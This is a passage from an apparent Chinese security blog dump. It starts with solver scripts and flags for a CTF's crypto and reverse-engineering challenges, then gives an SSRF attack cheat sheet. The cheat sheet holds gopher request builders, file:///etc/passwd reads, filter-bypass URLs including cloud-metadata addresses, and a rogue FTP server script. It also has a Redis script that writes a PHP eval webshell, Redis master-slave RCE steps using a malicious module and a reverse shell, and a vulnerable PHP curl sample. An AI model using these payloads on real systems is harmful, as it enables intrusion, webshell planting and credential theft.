448 741 151 22 831 558 73 472 665 126 949 144 986 643 997 92 881 557 7807051740 158 620 912 266 1013 796 718 563 379 70 523 438 424 213 230 908 135 753 182 369 869 570 335 670 693 691 536 217 809 665 222 82 959 31 8483230841 673 73 676 652 87 141 148 850 360 0 380 958 839 595 431 92 65 673 698 638 491 73 462 114 414 888 364 470 526 1012 543 794 720 744 8045288401 490 262 971 940 535 93 1003 427 149 250 614 939 392 848 941 109 851 610 773 56 132 512 39 980 924 804 490 156 111 596 227 369 525 864 85385801010 82 401 277 207 10 766 623 594 287 318 46 465 122 747 895 101 448 931 201 278 554 1007 914 524 472 861 230 65 585 504 133 858 443 169 859817424 492 794 572 1002 650 185 519 556 484 215 622 765 498 818 1002 908 906 798 168 802 414 650 872 20 422 677 469 129 903 823 693 791 538 154 9669615193 369 816 16 832 195 350 157 788 474 842 378 221 922 58 965 345 61 512 4 940 251 705 891 506 49 427 149 552 967 649 756 164 639 88 7413954853 364 480 712 448 505 722 6 580 820 143 174 716 381 814 635 689 99 939 564 901 881 301 796 984 44 392 818 803 702 817 488 127 340 188 8596218771 953 261 317 610 8 372 794 469 874 531 629 252 393 52 919 12 568 46 970 722 306 928 597 993 442 158 385 636 226 363 302 977 138 473 8848620224 584 993 838 889 769 342 360 734 464 871 584 21 683 1003 465 146 665 492 309 89 212 843 4 53 191 512 535 439 325 888 343 567 427 9 7388411961 269 239 353 778 88 592 995 673 29 382 180 788 915 496 278 591 933 770 629 64 777 834 1015 776 763 147 192 915 986 466 256 335 380 653 9793294699 35 335 332 424 388 819 194 791 557 771 627 895 995 389 550 387 293 175 16 837 898 768 9 136 33 728 593 556 154 755 411 193 969 802 8135375749 832 428 87 475 816 331 1001 338 909 6 854 669 970 781 274 556 194 896 51 566 988 993 732 805 978 536 566 553 696 235 319 625 670 944 9922037908 65 915 341 838 709 234 928 732 296 437 604 685 35 750 296 379 465 207 825 239 618 837 905 544 336 854 351 270 631 641 1004 238 509 696 8712695208 314 374 647 286 32 275 987 819 119 522 276 313 663 18 3 521 539 115 57 783 56 647 761 122 146 544 168 277 948 661 7 219 765 452 6473121689 32 710 20 73 611 523 377 751 812 370 905 598 5 156 796 954 443 349 202 444 996 711 1012 831 558 254 785 297 916 98 896 749 788 134 9310929223 941 599 396 675 40 764 638 13 320 1013 267 370 175 733 946 845 644 271 812 727 815 683 685 753 818 686 315 378 160 529 440 877 613 220 9348582765 677 735 425 923 133 683 20 79 220 112 706 432 972 549 862 938 194 235 365 1004 945 696 646 157 44 700 870 168 695 162 640 687 337 623 8841182744 408 273 93 935 143 356 815 642 29 793 664 755 47 886 810 867 380 645 745 39 68 353 933 337 603 733 499 986 773 604 559 106 947 567 8965864161 85 548 849 4 843 383 209 672 761 209 149 473 776 1014 426 582 579 406 1006 367 578 234 779 20 263 155 203 649 925 106 287 696 73 461 7258983757 685 465 259 64 523 306 179 945 995 82 859 646 981 928 181 606 289 387 507 834 360 327 86 245 219 603 520 667 162 331 546 245 299 1000 7464039309 992 939 155 930 15 579 705 267 546 307 370 855 462 843 145 535 740 586 531 1003 656 600 883 801 172 322 532 803 319 643 496 835 414 72 8863792571 286 93 300 806 548 451 530 804 875 724 709 637 28 145 763 446 264 480 691 540 699 807 236 515 770 623 793 458 1000 470 457 965 566 379 9882639901 238 651 488 778 35 14 127 1022 481 261 113 486 437 252 499 74 253 211 882 150 421 496 85 60 457 999 934 827 1018 496 539 428 510 892 8009103348 862 994 846 671 692 1011 730 83 875 146 858 205 55 811 669 943 425 372 837 365 386 692 353 784 488 774 297 367 414 92 307 975 686 210 9357962966 654 48 123 703 168 757 586 129 317 330 544 211 520 309 425 600 282 906 956 394 577 728 617 910 350 458 64 651 112 610 858 536 426 819 8059368250 187 608 352 563 714 664 829 625 649 581 345 110 36 153 659 487 1016 14 49 850 721 276 994 209 529 404 961 808 5 109 923 839 582 992 9366682128 320 933 837 149 374 22 663 647 1008 844 270 530 567 451 96 525 353 888 754 153 647 183 353 772 281 148 369 286 781 134 966 123 317 68 5933023794 278 989 582 849 10 529 943 902 679 39 420 492 191 360 348 1020 1020 551 808 113 307 468 524 444 801 792 817 350 16 898 554 975 842 700 10213211420 19 983 47 541 351 1014 428 236 710 502 74 399 142 586 30 419 485 543 665 741 861 340 396 272 797 405 238 765 362 742 606 199 661 360 7518069764 719 234 197 99 70 38 113 546 420 969 584 176 404 751 642 364 845 702 501 509 451 161 638 87 576 346 839 93 698 98 777 516 963 898 7135907265 984 660 638 1009 23 951 698 400 6 913 63 911 591 187 718 655 695 49 422 974 906 1010 198 178 73 39 402 258 77 695 969 536 789 675 8524911&#x27;&#x27;&#x27;.strip().split(&#x27;\\n&#x27;)A = []B = []for k in s: li = k.strip().split(&#x27; &#x27;) li = [int(x) for x in li] A.append(li[:-1]) B.append(li[-1])print(A)print(B) 放到Sage下求解一把梭： 12345#SageA = Matrix([[...],[...],[...],...,[...]]) #AY = vector([...]) #BA \\ Y# 将list值输入交互得flag： flag: GWHT{4b55c1d5fb6a0234fc252b19e510301a} ​ REVERSElogin 快乐签到！注：得到的 flag 需要 MD5 之后再做提交 183.129.189.60:10028 拖到IDA查看字符串发现很多Py开头的函数，肯定是python写的程序了。 python反编译，先用pyinstxtractor还原到pyc文件，再用uncompyle6还原到py文件。 开始在Python3.8环境下还原发现py文件有问题，根据提示重装至Python3.6环境，还原得到正常的login.py源文件： 12345678910111213141516171819202122232425262728293031323334353637# uncompyle6 version 3.7.2# Python bytecode 3.6 (3379)# Decompiled from: Python 3.8.2 (default, Apr 1 2020, 15:52:55) # [GCC 9.3.0]# Embedded file name: login.pyimport sysinput1 = input(&#x27;input something:&#x27;)if len(input1) != 14: print(&#x27;Wrong length!&#x27;) sys.exit()else: code = [] for i in range(13): code.append(ord(input1[i]) ^ ord(input1[(i + 1)])) code.append(ord(input1[13])) a1 = code[2] a2 = code[1] a3 = code[0] a4 = code[3] a5 = code[4] a6 = code[5] a7 = code[6] a8 = code[7] a9 = code[9] a10 = code[8] a11 = code[10] a12 = code[11] a13 = code[12] a14 = code[13] if (a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748) &amp; (a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258) &amp; (a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190) &amp; (a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + (a8 &lt;&lt; 7) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136) &amp; (a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915) &amp; (a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298) &amp; (a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875) &amp; (a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784) &amp; (a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710) &amp; (a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376) &amp; (a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065) &amp; (a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687) &amp; (a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250) &amp; (a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317): print(&#x27;flag is GWHT&#123;md5(your_input)&#125;&#x27;) print(&#x27;Congratulations and have fun!&#x27;) else: print(&#x27;Sorry,plz try again...&#x27;)# okay decompiling login.pyc 三步，1.两两字符异或，2.打乱顺序，3.生成线性方程组。 通过Sage解线性方程组，还原code数组顺序，最后从后往前依次异或还原，md5哈希得flag。 格式化+Sage解方程组： 123456789101112s = &#x27;&#x27;&#x27;(a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748) &amp; (a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258) &amp; (a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190) &amp; (a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + (a8 &lt;&lt; 7) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136) &amp; (a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915) &amp; (a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298) &amp; (a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875) &amp; (a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784) &amp; (a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710) &amp; (a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376) &amp; (a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065) &amp; (a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687) &amp; (a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250) &amp; (a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317)&#x27;&#x27;&#x27;.split(&#x27;&amp;&#x27;)A = []B = []for k in s: t = k.strip().strip(&#x27;(&#x27;).strip(&#x27;)&#x27;).split(&#x27;==&#x27;) exp = t[0].replace(&#x27;a1 * &#x27;,&#x27;&#x27;).replace(&#x27; + a2 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a3 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a4 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a5 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a6 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a7 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a8 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a9 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a10 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a11 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a12 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a13 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a14 *&#x27;,&#x27;,&#x27;).replace(&#x27; - a2 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a3 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a4 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a5 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a6 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a7 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a8 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a9 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a10 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a11 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a12 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a13 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a14 *&#x27;,&#x27;, -&#x27;).replace(&#x27; + (a8 &lt;&lt; 7)&#x27;,&#x27;, &#x27;+str(2**7)) A.append(eval(&#x27;[&#x27;+exp+&#x27;]&#x27;)) B.append(int(t[1]))print(A)print(B) 还原code数组顺序 123456ind = [2, 1, 0, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13]out = [119, 24, 10, 7, 104, 43, 28, 91, 52, 108, 88, 74, 88, 33]ori = [out[ind.index(i)] for i in range(14)]print(ori)#[10, 24, 119, 7, 104, 43, 28, 91, 108, 52, 88, 74, 88, 33] 字符异或 12345678out = [10, 24, 119, 7, 104, 43, 28, 91, 108, 52, 88, 74, 88, 33]flag = out[:]for i in range(12,-1,-1): flag[i] ^= flag[i+1] print(&#x27;&#x27;.join([chr(k) for k in flag]))#U_G07_th3_k3y! 对input进行md5哈希得flag。 flag: GWHT{58964088b637e50d3a22b9510c1d1ef8} ​ Bytecode 了解一下Bytecode 按照Python字节码规则手工逆向，还原过程中可不断使用python -m dis code.py对比是否正确。 还原出源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748en=[3,37,72,9,6,132]output=[101,96,23,68,112,42,107,62,96,53,176,179,98,53,67,29,41,120,60,106,51,101,178,189,101,48]print(&#x27;welcome to GWHT2020&#x27;)flag=raw_input(&#x27;please input your flag:&#x27;)str=flaga=len(str)if a&lt;38: print(&#x27;length wrong!&#x27;) exit(0) if (((ord(str[0])*2020+ord(str[1]))*2020+ord(str[2]))*2020+ord(str[3]))*2020+ord(str[4])==1182843538814603: print(&#x27;good!continue\\xe2\\x80\\xa6\\xe2\\x80\\xa6&#x27;)else: print(&#x27;bye~&#x27;) exit(0)#GWHT&#123; x=[]k=5for i in range(13): b=ord(str[k]) c=ord(str[k+1]) a11=c^en[i%6] a22=b^en[i%6] x.append(a11) x.append(a22) k+=2if x==output: print(&#x27;good!continue\\xe2\\x80\\xa6\\xe2\\x80\\xa6&#x27;)else: print(&#x27;oh,you are wrong!&#x27;) exit(0)l=len(str)a1=ord(str[l-7])a2=ord(str[l-6])a3=ord(str[l-5])a4=ord(str[l-4])a5=ord(str[l-3])a6=ord(str[l-2])if a1*3+a2*2+a3*5==1003: if a1*4+a2*7+a3*9==2013: if a1+a2*8+a3*2==1109: if a4*3+a5*2+a6*5==671: if a4*4+a5*7+a6*9==1252: if a4+a5*8+a6*2==644: print(&#x27;congraduation!you get the right flag!&#x27;) 三部分，1.简单爆破，可直接猜测出GWHT&#123;，2.数组异或，反推，3.线性方程组，Sage解。 连起来即flag。 数组异或 12345678910111213en = [3,37,72,9,6,132]output = [101,96,23,68,112,42,107,62,96,53,176,179,98,53,67,29,41,120,60,106,51,101,178,189,101,48]ori = &#x27;&#x27;k = 0for i in range(13): c = output[k]^en[i%6] b = output[k+1]^en[i%6] ori += chr(b)+chr(c) k += 2 print(ori)#cfa2b87b3f746a8f0ac5c5963f Sage解方程组 123456789#SageA = Matrix([[3,2,5],[4,7,9],[1,8,2]])Y1 = vector([1003,2013,1109])Y2 = vector([671,1252,644])print(A \\ Y1)print(A \\ Y2)#(97, 101, 102)#(102, 55, 51)#aef73 flag: GWHT{cfa2b87b3f746a8f0ac5c5963faef73} ​ easyre easyre IDA打开，跟踪到main函数，代码逻辑清晰，输入字符串通过三步加密处理得到密文： encode_one是base64编码函数，encode_two是字符串分四块乱序函数，encode_three是简单移位函数。 Python脚本： 123456789101112131415161718192021222324252627s=&#x27;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG&#x27;t=&#x27;&#x27;for i in range(len(s)): x=ord(s[i]) for j in range(127): y=-1 if j&lt;=64 or j&gt;90: if j&lt;=96 or j&gt;122: if j&lt;=47 or j&gt;57: y=j else: y=(j-48+3)%10+48 else: y=(j-97+3)%26+97 else: y=(j-65+3)%26+65 if y==x: t+=chr(j)#t=&#x27;BjYjM2Mjk4NzMR1dIVHs2NzJjY0MTEzM2VhMn0=zQ3NzhhMzhlOD&#x27;u=t[13:26]+t[39:]+t[:13]+t[26:39]#u=&#x27;R1dIVHs2NzJjYzQ3NzhhMzhlODBjYjM2Mjk4NzM0MTEzM2VhMn0=&#x27;import base64print(base64.b64decode(u.encode()))#GWHT&#123;672cc4778a38e80cb362987341133ea2&#125; flag: GWHT{672cc4778a38e80cb362987341133ea2}","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"SSRF","slug":"web-SSRF","date":"2020-09-03T04:02:21.000Z","updated":"2024-10-13T09:13:43.372Z","comments":true,"path":"2020/09/03/web-SSRF/","permalink":"https://lazzzaro.github.io/2020/09/03/web-SSRF/","excerpt":"","text":"​ 服务器端请求伪造（SSRF）SSRF（Server-Side Request Forger，服务器端请求伪造）是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 ​ 基本SSRF构造POST请求12345678910111213141516import urllib.parsepayload =\\&quot;&quot;&quot;POST /cmd HTTP/1.1Host: 127.0.0.1:8000Content-Type: application/x-www-form-urlencodedContent-Length: 7cmd=env&quot;&quot;&quot; #注意后面一定要有回车，回车结尾表示http请求结束tmp = urllib.parse.quote(payload)new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)result = &#x27;gopher://127.0.0.1:8000/&#x27;+&#x27;_&#x27;+newresult = urllib.parse.quote(result)print(result) 123456789101112131415161718HTTP内容获取http://127.0.0.1:80http://0.0.0.0:80http://localhost:80读文件file://path/to/filefile:///etc/passwdfile://\\/\\/etc/passwdssrf.php?url=file:///etc/passwd端口探测（Burpsuite自定义迭代器）dict://&lt;user&gt;;&lt;auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;:&lt;database&gt;:&lt;n&gt;ssrf.php?url=dict://attacker:11111/命令执行/反弹shell（POST请求）gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_&lt;两次URL编码的TCP数据流&gt;gopher://172.17.0.7:80/_POST%2520/index.php%2520HTTP/1.1%250d%250AHost:172.17.0.7%250d%250AContent-Type:application/x-www-form-urlencoded%250d%250AContent-Length:36%250d%250A%250d%250Aname=admin%26password=123456%26result=60%250d%250A 参考：手把手带你用 SSRF 打穿内网 ​ 常用文件123456内网IP地址信息：/etc/hosts网络情况：/proc/net/arp/etc/network/interfaces ​ 绕过12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364HTTPS协议https://127.0.0.1/https://localhost/[::]http://[::]:80/http://0000::1:80/域名跳转http://spoofed.burpcollaborator.nethttp://localtest.mehttp://customer1.app.localhost.my.company.127.0.0.1.nip.iohttp://mail.ebc.apple.com redirect to 127.0.0.6 == localhosthttp://bugbounty.dod.network redirect to 127.0.0.2 == localhost&lt;anything&gt;.&lt;IP Address&gt;.nip.ioCIDRhttp://127.127.127.127http://127.0.1.3http://127.0.0.0十进制IP地址http://0177.0.0.1/http://2130706433/ = http://127.0.0.1http://3232235521/ = http://192.168.0.1http://3232235777/ = http://192.168.1.1IPv6/IPv4地址嵌入http://[0:0:0:0:0:ffff:127.0.0.1]去0地址http://0/http://127.1http://127.0.1bash变量（curl情况）curl -v &quot;http://evil$google.com&quot;$google = &quot;&quot;组合技巧http://1.1.1.1 &amp;@2.2.2.2# @3.3.3.3/urllib2 : 1.1.1.1requests + browsers : 2.2.2.2urllib : 3.3.3.3绕过filter_var()0://evil.com:80;http://google.com:80/绕弱parserhttp://127.1.1.1:80\\@127.2.2.2:80/http://127.1.1.1:80\\@@127.2.2.2:80/http://127.1.1.1:80:\\@@127.2.2.2:80/http://127.1.1.1:80#\\@127.2.2.2:80/DNS记录（检测带外流量监控平台：http://ceye.io/dns-rebinding）http://169.254.169.254http://metadata.nicob.net/http://169.254.169.254.xip.io/http://1ynrnhl.xip.io/http://www.owasp.org.1ynrnhl.xip.io/HTTP302跳转静态:http://nicob.net/redir6a动态:http://nicob.net/redir-http-169.254.169.254:80- ​ 攻击Redis未授权访问PHPShell1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162# 脚本1# PHPShell写入脚本import socketfrom urllib.parse import unquote# 对gopherus生成的payload进行一次urldecodepayload = unquote(&quot;&quot;)payload = payload.encode(&#x27;utf-8&#x27;)host = &#x27;0.0.0.0&#x27;port = 23sk = socket.socket()sk.bind((host, port))sk.listen(5)# ftp被动模式的passvie port,监听到1234sk2 = socket.socket()sk2.bind((host, 1234))sk2.listen()# 计数器，用于区分是第几次ftp连接count = 1while 1: conn, address = sk.accept() conn.send(b&quot;200 \\n&quot;) print(conn.recv(20)) # USER aaa\\r\\n 客户端传来用户名 if count == 1: conn.send(b&quot;220 ready\\n&quot;) else: conn.send(b&quot;200 ready\\n&quot;) print(conn.recv(20)) # TYPE I\\r\\n 客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本 if count == 1: conn.send(b&quot;215 \\n&quot;) else: conn.send(b&quot;200 \\n&quot;) print(conn.recv(20)) # SIZE /123\\r\\n 客户端询问文件/123的大小 if count == 1: conn.send(b&quot;213 3 \\n&quot;) else: conn.send(b&quot;300 \\n&quot;) print(conn.recv(20)) # EPSV\\r\\n&#x27; conn.send(b&quot;200 \\n&quot;) print(conn.recv(20)) # PASV\\r\\n 客户端告诉服务端进入被动连接模式 if count == 1: conn.send(b&quot;227 192,168,160,129,4,210\\n&quot;) # 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234 else: conn.send(b&quot;227 127,0,0,1,24,235\\n&quot;) # 端口计算规则：24*256+235=9000 print(conn.recv(20)) # 第一次连接会收到命令RETR /123\\r\\n，第二次连接会收到STOR /123\\r\\n if count == 1: conn.send(b&quot;125 \\n&quot;) # 告诉客户端可以开始数据链接了 # 新建一个socket给服务端返回我们的payload print(&quot;建立连接!&quot;) conn2, address2 = sk2.accept() conn2.send(payload) conn2.close() print(&quot;断开连接!&quot;) else: conn.send(b&quot;150 \\n&quot;) print(conn.recv(20)) exit() # 第一次连接是下载文件，需要告诉客户端下载已经结束 if count == 1: conn.send(b&quot;226 \\n&quot;) conn.close() count += 1 12345678910111213141516171819202122232425262728293031323334353637# 脚本2# 写入shellimport urllib.parseprotocol = &quot;gopher://&quot;ip = &quot;127.0.0.1&quot;port = &quot;6379&quot;shell = &quot;\\n\\n&lt;?php eval($_POST[\\&quot;f4ke\\&quot;]);?&gt;\\n\\n&quot;filename = &quot;5he1l.php&quot;path = &quot;/var/www/html&quot;passwd = &quot;&quot;cmd = [&quot;auth 123123&quot;, &quot;flushall&quot;, &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)), &quot;config set dir &#123;&#125;&quot;.format(path), &quot;config set dbfilename &#123;&#125;&quot;.format(filename), &quot;save&quot;, &quot;quit&quot; ]if passwd: cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))payload = protocol + ip + &quot;:&quot; + port + &quot;/_&quot;def redis_format(arr): CRLF = &quot;\\r\\n&quot; redis_arr = arr.split(&quot; &quot;) cmd = &quot;&quot; cmd += &quot;*&quot; + str(len(redis_arr)) for x in redis_arr: cmd += CRLF + &quot;$&quot; + str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)))) + CRLF + x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;) cmd += CRLF return cmdif __name__==&quot;__main__&quot;: for x in cmd: payload += urllib.parse.quote(redis_format(x)) # print(payload) print(urllib.parse.quote(payload)) 主从复制主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 Redis的持久化使得机器即使重启数据也不会丢失，因为Redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主Redis的数据和从Redis上的数据保持实时同步，当主Redis写入数据是就会通过主从复制复制到其它从Redis。 主从复制从ssrf-&gt;rce原理：在全量复制过程中，恢复rdb文件，如果我们将rdb文件构造为恶意的exp.so，从节点即会自动生成，使得可以RCE。 一键自动化RCE在Redis 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在Redis中实现一个新的Redis命令，通过写C语言编译并加载恶意的.so文件，达到代码执行的目的。 通过脚本实现一键自动化getshell： 方法1： 1、生成恶意.so文件，下载 RedisModules-ExecuteCommand，使用make编译即可生成。 2、攻击端执行 redis-rce： python redis-rce.py -r 目标IP -p 目标端口 -L 本地IP -f 恶意.so 方法2： Redis Rogue Server 手动方式1、编写脚本，构造恶意Redis服务器，监听本地端口1234，加载exp.so。 python RogueServer.py --lport 1234 --exp exp.so 2、通过未授权访问连入要攻击的redis服务器。 执行相关命令： 12345678910111213141516171819#设置redis的备份路径为当前目录 config set dir ./#设置备份文件名为exp.so，默认为dump.rdb config set dbfilename exp.so#设置主服务器IP和端口 slaveof 192.168.172.129 1234 #加载恶意模块 module load ./exp.so#切断主从，关闭复制功能 slaveof no one #执行系统命令 system.exec &#x27;whoami&#x27; system.rev 127.0.0.1 9999 #通过dump.rdb文件恢复数据 config set dbfilename dump.rdb#删除exp.so system.exec &#x27;rm ./exp.so&#x27;#卸载system模块的加载 module unload system SSRF+Redis 反弹shell以curl为例，漏洞代码为ssrf.php: 123456789&lt;?php$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $_GET[&#x27;url&#x27;]);#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_HEADER, 0);#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);curl_exec($ch);curl_close($ch);?&gt; 环境准备： 模拟内网未授权Redis服务器：1.1.1.1 模拟攻击者机器：2.2.2.2 在攻击者机器上构建恶意Redis服务器，同时监听本地9999端口等待shell返回。 